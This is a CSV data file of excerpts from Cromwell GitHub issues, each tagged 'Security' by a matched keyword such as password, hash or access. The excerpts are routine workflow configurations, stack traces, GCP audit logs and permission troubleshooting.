Security,"from_runtime_memory(runtime.ram))m"",; ""position"": -1; }; ],; ""inputs"": [; {; ""type"": ""Directory"",; ""doc"": ""Path to AMBER output. This should correspond to the output_dir used in AMBER.\n"",; ""inputBinding"": {; ""prefix"": ""-amber""; },; ""id"": ""#purple-2.44.cwl/amber""; },; {; ""type"": [; ""null"",; ""File""; ],; ""doc"": ""Location of circos binary.\nOptional path to circos binary.\nWhen supplied, circos graphs will be written to <output_dir>/plot\n"",; ""inputBinding"": {; ""prefix"": ""-circos""; },; ""id"": ""#purple-2.44.cwl/circos""; },; {; ""type"": ""Directory"",; ""doc"": ""Path to COBALT output. This should correspond to the output_dir used in COBALT.\n"",; ""inputBinding"": {; ""prefix"": ""-cobalt""; },; ""id"": ""#purple-2.44.cwl/cobalt""; },; {; ""type"": [; ""null"",; ""boolean""; ],; ""doc"": ""Optionally include if you wish to persist results to a database. Database initialization script can be found here.\n"",; ""inputBinding"": {; ""prefix"": ""-db_enabled""; },; ""id"": ""#purple-2.44.cwl/db_enabled""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""Database password. Mandatory if db_enabled.\n"",; ""inputBinding"": {; ""prefix"": ""-db_pass""; },; ""id"": ""#purple-2.44.cwl/db_pass""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""Database url in form: mysql://host:port/database\nMandatory if db_enabled.\n"",; ""inputBinding"": {; ""prefix"": ""-db_url""; },; ""id"": ""#purple-2.44.cwl/db_url""; },; {; ""type"": [; ""null"",; ""string""; ],; ""doc"": ""Database user name. Mandatory if db_enabled.\n"",; ""inputBinding"": {; ""prefix"": ""-db_user""; },; ""id"": ""#purple-2.44.cwl/db_user""; },; {; ""type"": [; ""null"",; ""boolean""; ],; ""doc"": ""Persist data to DB.\n"",; ""inputBinding"": {; ""prefix"": ""-driver_catalog""; },; ""default"": false,; ""id"": ""#purple-2.44.cwl/driver_catalog""; },; {; ""type"": ""File"",; ""doc"": ""Path to GC profile.\n"",; ""inputBinding"": {; ""prefix"": ""-gc_profile""; },; ""id"": ""#purple-2.44.cwl/gc_profile""; },; {; ""type"": [; ""null"",; ""float""; ],; ""doc"": ""Proportion of genome that must be diploid before using somatic fit. Default 0.97.\n"",; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:28931,password,password,28931,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['password'],['password']
Security,"ftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4618,Validat,Validation,4618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,2,['Validat'],"['Validation', 'ValidationTry']"
Security,"fully; [2022-12-15 21:23:00,37] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.date_of_death:-1:1-20000000026 [9e4f5894main.date_of_death:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,37] [info] BT-322 9e4f5894:main.date_of_death:-1:1 cache hit copying success with aggregated hashes: initial = 179EA0EE9B87629C24E64D33DEB38610, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,37] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.date_of_death:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,67] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.white_brits:-1:1-20000000000 [9e4f5894main.white_brits:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,68] [info] BT-322 9e4f5894:main.white_brits:-1:1 cache hit copying success with aggregated hashes: initial = EB2F16A657136E0208581A7B6A7F020F, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,68] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.white_brits:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.year_of_birth' (scatter index: None, attempt 1); [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.phenotype' (scatter index: None, attempt 1); [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.date_of_death' (scatter index: None, attempt 1); [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCach",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:26898,hash,hashes,26898,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"fun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This test passes in Travis and it might have different folder st",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4705,Validat,Validation,4705,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,2,['Validat'],"['Validation', 'ValidationTry']"
Security,"g these timeouts allow rest api responses for very large jobs; # to be returned to the user. When the timeout is reached the server would respond; # `The server was not able to produce a timely response to your request.`; # https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows; request-timeout = 600s; idle-timeout = 600s; }; }; }. services {; MetadataService {; #class = ""cromwell.services.metadata.impl.MetadataServiceActor""; config {; metadata-read-row-number-safety-threshold = 2000000; # # For normal usage the default value of 200 should be fine but for larger/production environments we recommend a; # # value of at least 500. There'll be no one size fits all number here so we recommend benchmarking performance and; # # tuning the value to match your environment.; db-batch-size = 700; }; }; }. google {. application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. docker {; hash-lookup {; method = ""remote""; }; }. engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }. call-caching {; enabled = true; }. backend {; default = GCPBATCH; providers {; GCPBATCH {; // life sciences; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {; ## Google project; project = ""$PROJECT"". ## Base bucket for workflow executions; root = ""$BUCKET""; name-for-call-caching-purposes: PAPI; #60000/min in google; ##genomics-api-queries-per-100-seconds = 90000; virtual-private-cloud {; network-name = ""$NET""; subnetwork-name = ""$SUBNET""; }; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; 	 request-workers = 4; batch-timeout = 7 days; 	 # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; 	 slow-job-warning-time: 24 hours; genomics {; // A reference to an auth defined in t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:9515,hash,hash-lookup,9515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['hash'],['hash-lookup']
Security,"g to add role `storage.objects.create` it errors out with:; ```; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.create is not supported for this resource.; ```; and there is clearly an extra role missing as roles `storage.objectCreator`, `storage.objectViewer`, `genomics.pipelinesRunner`, `genomics.admin`, `iam.serviceAccountUser` (corresponding to roles Storage Object Creator, Storage Object Viewer, Genomics Pipelines Runner, Genomics Admin, Service Account User) are not sufficient to create files inside Google buckets. 3) The [permissions](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#permissions) section guides the user into creating a new service account under the current project. This would need to be selected in the configuration file with an authorization with `scheme = ""service_account""` but instead both the configuration file for [PAPIv2](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#setting-up-papiv2) and the configuration file for [PAPIv1](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#lets-get-started) are configured to use an authorization with `scheme = ""application_default""`. I find it very hard to believe that any novel user could go through the tutorial and successfully set up a Cromwell server. On a slightly different note, some of my issues would be resolved if I could run jobs using my user account rather than a service account associated with my project. In the Google [backends](https://cromwell.readthedocs.io/en/stable/backends/Google/) section of the docs there is a lonely mention of the `scheme = ""user_account""` but no further explanation. According to the [source code](https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/test/scala/cromwell/cloudsupport/gcp/GoogleCon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349:2594,authoriz,authorization,2594,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349,2,['authoriz'],['authorization']
Security,"g"": ""DFC652723D8EBD4BB25CAC21431BB6C0""; },; ""input count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""backend name"": ""2A2AB400D355AC301859E4ABB5432138"",; ""command template"": ""AFAC58B849BD67585A857F538B8E92F6""; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ```. ```; # simple sge apptainer conf (modified from the slurm one); #; workflow-options; {; workflow-log-dir: ""cromwell-workflow-logs""; workflow-log-temporary: false; workflow-failure-mode: ""ContinueWhilePossible""; default; {; workflow-type: WDL; workflow-type-version: ""draft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdbc.Driver""; user = ""<user>""; password = ""<pass>"" ; connectionTimeout = 5000; }; }; }. call-caching; {; enabled = true; invalidate-bad-cache-result = true; }. docker {; hash-lookup {; enabled = true; }; }. backend {; default = sge; providers {. ; sge {; 	actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; #concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:2168,hash,hash-lookup,2168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,1,['hash'],['hash-lookup']
Security,"gine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.j",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6770,secur,security,6770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"gle.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; requestMetadata:; callerIp: 69.173.70.180; callerSuppliedUserAgent: (gzip),gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T11:58:49.543410910Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T11:58:49.691467944Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T11:58:49.452628092Z'; ```. The princip",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:1563,audit,audit,1563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,1,['audit'],['audit']
Security,"going to restructure for unit tests, also I'd like to see this work with controlled access data at least once during manual testing...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934:84,access,access,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934,1,['access'],['access']
Security,gotc-prod; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/compute; - https://www.googleapis.com/auth/devstorage.full_control; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/devstorage.full_control; - https://www.googleapis.com/auth/devstorage.read_write; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/compute; runtimeMetadata:; '@type': type.googleapis.com/google.genomics.v1alpha2.RuntimeMetadata; computeEngine:; diskNames:; - local-disk-15719508696139283496; instanceName: ggp-15719508696139283496; machineType: us-central1-c/n1-highmem-2; zone: us-central1-c; startTime: '2016-09-28T07:20:39Z'; name: operations/EIf5mP32Khio-K6o-ru6k9oBIJ-ikOmeDSoPcHJvZHVjdGlvblF1ZXVl; ```. from .21:. ```; resources:; bootDiskSizeGb: 10; disks:; - autoDelete: true; mountPoint: /cromwell_root; name: local-disk; sizeGb: 200; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; preemptible: true; zones:; - us-central1-b; - us-central1-c; pipelineArgs:; clientId: ''; inputs:; exec: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/exec.sh; input_bam-0: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-SortAndFixReadGroupBam/shard-22/HTC3GCCXX.8.Pond-536132.sorted.bam; ref_dict-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.dict; ref_fasta-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta; ref_fasta_index-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta.fai; logging:; gcsPath: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22.log; outputs:; HTC3GCCXX.8.Pond-536132.validation_report: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1501:3375,Validat,ValidateReadGroupSamFile,3375,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1501,1,['Validat'],['ValidateReadGroupSamFile']
Security,"guration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I am running Cromwell on GCP, launching a workflow that shards into ~5,000 pieces. I am getting the following error: `cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out`. ```; 2019-04-29 00:02:13,419 cromwell-system-akka.dispatchers.backend-dispatcher-139 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(95b34a77)vcf2bigquery.convertVCF:2058:1]: Status chang; e from Running to Success; 2019-04-29 00:02:24,760 cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:171); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:975); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:933); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:735); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:678); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1587); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1492); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:347); at com.google.api.client.http.javanet.NetHttp",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914:1710,secur,security,1710,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914,1,['secur'],['security']
Security,h maps to host; location /mnt/local-disk/exec.sh.; 2017/02/07 15:41:48 I: Copying; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1649,access,access,1649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"h seems to be the simplest and demonstrates the issues clearly enough. The crux of this test is that the Docker image that is specified for the task is in a private repo to which the Centaur service account has been granted access. This test passes on PAPI v2 but on GCP Batch jobs fail with messages like the following visible in `gcloud batch jobs describe`:. ```; Job state is set from RUNNING to FAILED for job projects/1005074806481/locations/us-central1/jobs/job-27607753-d2d5-404d-89af-a786da8ad383.Job; failed due to task failure. Specifically, task with index 0 failed due to the; following task event: ""Task state is updated from RUNNING to FAILED on zones/us-central1-b/instances/8098872438472929780; with exit code 125."". ```. Exit code 125 being a typical ""[something's wrong with that Docker invocation](https://stackoverflow.com/questions/53640424/exit-code-125-from-docker-when-trying-to-run-container-programmatically)"" error. in Cloud Logging I see the following, including what looks like a plaintext password which I have x'd out below:. ```; Executing runnable container:{image_uri:""broadinstitute/cloud-cromwell@sha256:0d51f90e1dd6a449d4587004c945e43f2a7bbf615151308cff40c15998cc3ad4"" commands:""/mnt/disks/cromwell_root/script"" entrypoint:""/bin/bash"" volumes:""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root"" username:""firecloud"" password:""xxxxx""} labels:{key:""tag"" value:""UserRunnable""} for Task task/job-27607753-d2d5-132dc052-df92-4db100-group0-0/0/0 in TaskGroup group0 of Job job-27607753-d2d5-132dc052-df92-4db100.; ```. So it looks like the GCP Batch backend has acquired and plumbed through the required Docker credentials, but the login to Docker Hub doesn't seem to have happened. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [ ] I updated `CHANGELOG.md` in this PR; - [x] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515:1283,password,password,1283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515,1,['password'],['password']
Security,"h the code a bit but couldn't find where I can add that profilename to the config. If there is a way to change the profile name I would definitely use it, if not then I can set things up differently. Thanks. `cromwell_1 | Caused by: software.amazon.awssdk.core.exception.SdkClientException: Unable to load credentials from any of the providers in the chain AwsCredentialsProviderChain(credentialsProviders=[SystemPropertyCredentialsProvider(), EnvironmentVariableCredentialsProvider(), ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])), ContainerCredentialsProvider(), InstanceProfileCredentialsProvider()]) : [SystemPropertyCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property 